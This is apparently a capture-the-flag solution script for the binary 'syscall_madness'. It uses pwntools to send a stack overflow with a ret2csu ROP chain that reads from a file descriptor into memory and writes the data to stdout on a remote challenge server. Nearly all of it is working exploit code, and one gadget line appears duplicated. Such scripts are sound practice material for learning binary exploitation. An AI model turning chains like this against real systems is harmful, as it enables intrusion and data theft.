from pwn import *

context.log_level = 'debug'
context(arch='amd64', os='linux')

#p = process("./syscall_madness")
p = remote("3.1.147.170", 10009)

# gdb.attach(p, gdbscript=f'''
# b *main
# ''')

elf = ELF("syscall_madness")

rop = ROP(elf)
# poprdxret = rop.find_gadget(["pop edx", "ret"])[0]

# 0x0000000000401155: pop rax; ret;
def pop_rax(v):
  try:
    return p64(0x0000000000401155) + p64(v)
  except struct.error:
    return p64(0x0000000000401155) + v


# 0x000000000040129b: pop rdi; ret;
def pop_rdi(v):
  return p64(0x000000000040129b) + p64(v)


# 0x0000000000401299: pop rsi; pop r15; ret;
def pop_rsi(v):
  return p64(0x0000000000401299) + p64(v) + p64(0x0)


# 0x0000000000401152: syscall; ret;
def syscall():
  return p64(0x0000000000401152)


# We don't have rdx gadget, but we probably still can read() to a writable mem and write() to stdout
writable_mem = 0x404500

'''
Populate rdx with ret2csu
0x0000000000401278 <+56>: mov    rdx,r14
Populate r14
0x0000000000401294: pop r12; pop r13; pop r14; pop r15; ret;
'''

offset = 16

payload = b"A" * 16

# read(fp, writable_mem, 0x50)
# 0x0000000000401155: pop rax; ret;
payload += p64(0x0000000000401155)
payload += p64(0) # read


# ret2csu part 1
'''
0x0000000000401292 <+82>: pop    rbx
0x0000000000401293 <+83>:  pop    rbp
0x0000000000401294 <+84>:  pop    r12
0x0000000000401296 <+86>:  pop    r13
0x0000000000401298 <+88>:  pop    r14
0x000000000040129a <+90>:  pop    r15
0x000000000040129c <+92>:  ret
'''
payload += p64(0x0000000000401292)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(5) # r12>edi # payload += p64(3) if local
payload += p64(writable_mem) # r13>rsi
payload += p64(0x50) # r14>rdx
payload += p64(0x0000000000404010) # r15

# ret2csu part 2
'''   
0x0000000000401278 <+56>: mov    rdx,r14
0x000000000040127b <+59>:  mov    rsi,r13
0x000000000040127e <+62>:  mov    edi,r12d
0x0000000000401281 <+65>:  call   QWORD PTR [r15+rbx*8]
'''
payload += p64(0x0000000000401278)

# ret2csu part 3
'''
0x000000000040128e <+78>: add    rsp,0x8
0x0000000000401292 <+82>:  pop    rbx
0x0000000000401293 <+83>:  pop    rbp
0x0000000000401294 <+84>:  pop    r12
0x0000000000401296 <+86>:  pop    r13
0x0000000000401298 <+88>:  pop    r14
0x000000000040129a <+90>:  pop    r15
0x000000000040129c <+92>:  ret
'''
payload += p64(0)                  # padding for "add rsp,0x8" instruction
payload += p64(0)                  # RBX
payload += p64(0)                  # RBP
payload += p64(0)                  # R12
payload += p64(0)                  # R13
payload += p64(0)                  # R14
payload += p64(0)                  # R15


# write(stdout writable_mem, 0x50)
# 0x0000000000401155: pop rax; ret;
payload += p64(0x0000000000401155)
payload += p64(1) # write

# ret2csu part 1
'''
0x0000000000401292 <+82>: pop    rbx
0x0000000000401293 <+83>:  pop    rbp
0x0000000000401294 <+84>:  pop    r12
0x0000000000401296 <+86>:  pop    r13
0x0000000000401298 <+88>:  pop    r14
0x000000000040129a <+90>:  pop    r15
0x000000000040129c <+92>:  ret
'''
payload += p64(0x0000000000401292)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(1) # r12>edi
payload += p64(writable_mem) # r13>rsi
payload += p64(0x50) # r14>rdx
payload += p64(0x0000000000404010) # r15

# ret2csu part 2
'''   
0x0000000000401278 <+56>: mov    rdx,r14
0x000000000040127b <+59>:  mov    rsi,r13
0x000000000040127e <+62>:  mov    edi,r12d
0x0000000000401281 <+65>:  call   QWORD PTR [r15+rbx*8]
'''
payload += p64(0x0000000000401278)
payload += p64(0x0000000000401278)

# ret2csu part 3
'''
0x000000000040128e <+78>: add    rsp,0x8
0x0000000000401292 <+82>:  pop    rbx
0x0000000000401293 <+83>:  pop    rbp
0x0000000000401294 <+84>:  pop    r12
0x0000000000401296 <+86>:  pop    r13
0x0000000000401298 <+88>:  pop    r14
0x000000000040129a <+90>:  pop    r15
0x000000000040129c <+92>:  ret
'''
payload += p64(0)                  # padding for "add rsp,0x8" instruction
payload += p64(0)                  # RBX
payload += p64(0)                  # RBP
payload += p64(0)                  # R12
payload += p64(0)                  # R13
payload += p64(0)                  # R14
payload += p64(0)                  # R15

p.recv()
p.sendline(payload)
p.interactive()